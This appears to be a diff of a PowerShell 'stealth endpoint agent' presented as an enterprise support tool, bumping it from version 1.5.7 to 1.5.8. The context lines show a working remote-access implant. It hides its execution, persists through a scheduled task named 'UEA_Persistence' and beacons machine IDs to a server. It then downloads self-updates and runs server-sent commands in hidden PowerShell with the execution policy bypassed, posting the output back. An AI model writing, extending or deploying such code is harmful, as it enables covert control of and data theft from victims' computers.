@@ -3,10 +3,11 @@ param(
 )
 
 # Unified Enterprise Agent (UEA)
-# Version: 1.5.7
+# Version: 1.5.8
 # Description: Professional stealth endpoint agent with premium Support GUI.
 
 # 1. ENVIRONMENT SANITATION
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $ProgressPreference = 'SilentlyContinue'
 $ErrorActionPreference = "Stop"
 $InstallDir = "$env:ProgramData\UnifiedAgent"
@@ -77,7 +78,7 @@ function Install-StealthAgent {
             }
         }
 
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.5.7" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.5.8" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -94,9 +95,9 @@ function Install-StealthAgent {
         Register-ScheduledTask -TaskName "UEA_Persistence" -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
         Start-ScheduledTask -TaskName "UEA_Persistence" | Out-Null
         
-        Log-Message "Stealth v1.5.7 Deployment Complete."
+        Log-Message "Stealth v1.5.8 Deployment Complete."
         if ($Host.Name -match "ConsoleHost" -or -not $PSCommandPath) {
-            Write-Host "Equinox Stealth Architecture v1.5.7 Deployed. Background process starting..."
+            Write-Host "Equinox Stealth Architecture v1.5.8 Deployed. Background process starting..."
             exit
         }
     } catch { Log-Message "Install Fail: $($_.Exception.Message)" }
@@ -107,8 +108,8 @@ try {
     $AgentId = try { (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID } catch { "$($env:COMPUTERNAME)-$(Get-Random)" }
     $SerialNumber = try { (Get-CimInstance Win32_Bios -ErrorAction SilentlyContinue).SerialNumber } catch { "Unknown" }
     
-    # Check for mandatory upgrade to 1.5.7
-    if (($PSCommandPath -ne $ScriptPath) -or (Test-Path $ScriptPath -and (Get-Content $ScriptPath | Select-Object -First 20 | Out-String) -notlike "*1.5.7*")) {
+    # 🛡️ Ghost-Proof Switch: Only install if we are NOT already running as the resident file
+    if ($PSCommandPath -ne $ScriptPath) {
         Install-StealthAgent
     }
 
@@ -117,7 +118,7 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.5.7 Started. ID: $AgentId"
+    Log-Message "Agent v1.5.8 Started. ID: $AgentId"
     # 5. HEARTBEAT LOOP
     while ($true) {
         try {
@@ -128,7 +129,7 @@ try {
             $Payload = @{
                 agentId = $AgentId
                 serialNumber = $SerialNumber
-                version = "1.5.7"
+                version = "1.5.8"
                 status = "online"
                 deviceName = $env:COMPUTERNAME
                 os = $OS
@@ -140,7 +141,7 @@ try {
             $Response = Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/heartbeat" -Body $BodyJson -ContentType "application/json"
 
             # Upgrade Hook
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.5.7")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.5.8")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
@@ -225,7 +226,8 @@ try { `$Web = New-Object System.Net.WebClient; `$ImgBytes = `$Web.DownloadData(`
                         $Result = powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd.payload.command 2>&1 | Out-String
                     }
                     if ($Result) {
-                        Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/result" -Body (ConvertTo-Json @{ agentId = $AgentId; commandId = $cmd.id; result = $Result }) -ContentType "application/json" | Out-Null
+                        $ResultPayload = @{ agentId = $AgentId; commandId = $cmd.id; result = $Result }
+                        Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/result" -Body ($ResultPayload | ConvertTo-Json) -ContentType "application/json" | Out-Null
                     }
                 } catch { Log-Message "Cmd Fail: $($_.Exception.Message)" }
             }
